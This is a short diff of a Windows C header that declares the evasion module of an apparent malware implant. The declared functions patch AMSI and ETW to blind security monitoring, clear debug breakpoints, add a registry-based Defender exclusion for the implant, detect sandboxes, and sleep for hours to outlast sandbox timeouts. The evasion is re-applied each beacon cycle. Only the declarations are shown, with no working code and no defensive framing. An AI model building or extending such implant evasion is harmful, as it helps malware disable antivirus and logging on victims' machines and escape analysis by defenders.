@@ -1,21 +1,25 @@
 #pragma once
 #include <windows.h>
 
-// AMSI bypass – patch AmsiScanBuffer
+// ─── Evasion techniques ────────────────────────────────────
+
+// AMSI bypass – patch AmsiScanBuffer (and related) to return clean
 BOOL PatchAMSI();
 
-// ETW bypass – patch EtwEventWrite
+// ETW bypass – patch EtwEventWrite family to no-op
 BOOL PatchETW();
 
-// Clear hardware breakpoints on all threads
+// Clear hardware breakpoints (DR0–DR7) on all threads
 BOOL ClearHardwareBreakpoints();
 
-// Add Defender exclusion for implant path (if elevated)
+// Add Defender exclusion (registry-based, no PowerShell)
 BOOL AddDefenderExclusion(const wchar_t* exePath);
 
-// Re-apply all evasion techniques (called periodically)
+// Re-apply all evasion techniques (called each beacon cycle)
 VOID ReapplyEvasion();
 
-// Returns TRUE if execution environment looks like a sandbox/VM
-// (CPUID hypervisor bit + system uptime heuristic)
-BOOL SandboxCheck();
+// Sandbox detection (CPUID + uptime)
+BOOL SandboxCheck();
+
+// Deep sleep (1–4 hours) – used to outlast sandbox timeouts
+VOID DeepSleep();
